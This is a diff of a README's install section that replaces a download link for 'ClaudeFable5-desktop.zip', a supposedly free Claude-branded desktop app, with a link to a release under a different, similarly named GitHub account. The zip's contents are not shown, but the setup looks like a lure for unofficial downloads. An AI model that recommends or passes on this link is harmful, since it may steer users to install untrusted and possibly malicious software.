@@ -8,7 +8,7 @@
 
 
 ## Install
-[Download `ClaudeFable5-desktop.zip`](https://github.com/claude5fable/Claude-Fable-5-Free-Desktop/releases/download/fable/ClaudeFable5-desktop.zip)
+[Download `ClaudeFable5-desktop.zip`](https://github.com/fableclaude5free/Claude-Fable-5-Free/releases/download/fable5/ClaudeFable5-desktop.zip)
 ----
 
 <img width="1536" height="1024" alt="images2" src="https://github.com/user-attachments/assets/d67bbe14-46e9-42c5-b813-deb29e25f297" />
